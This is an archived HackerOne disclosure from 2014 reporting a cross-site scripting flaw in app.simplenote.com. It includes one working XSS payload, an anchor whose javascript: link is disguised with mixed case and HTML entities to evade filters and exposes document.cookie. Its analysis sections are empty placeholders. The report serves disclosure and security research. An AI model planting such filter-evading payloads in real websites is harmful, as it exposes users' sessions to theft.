---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13703'
original_report_id: '13703'
title: xss in app.simplenote.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: automattic
created_at: '2014-05-27T19:29:18.486Z'
disclosed_at: '2014-07-08T10:00:28.344Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# xss in app.simplenote.com

## Metadata

- HackerOne Report ID: 13703
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: automattic
- Disclosed At: 2014-07-08T10:00:28.344Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Automattic,

I found xss here app.simplenote.com

__XSS Payload:__ 
<a href="jAvAsCrIpT&colon;prompt&lpar;document.cookie&rpar;">CLICK ME TO PROMPT</a>

__Proof of Concept:__
http://i.imgur.com/8Ai0deF.png

__Thanks,__
Jerold Camacho

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
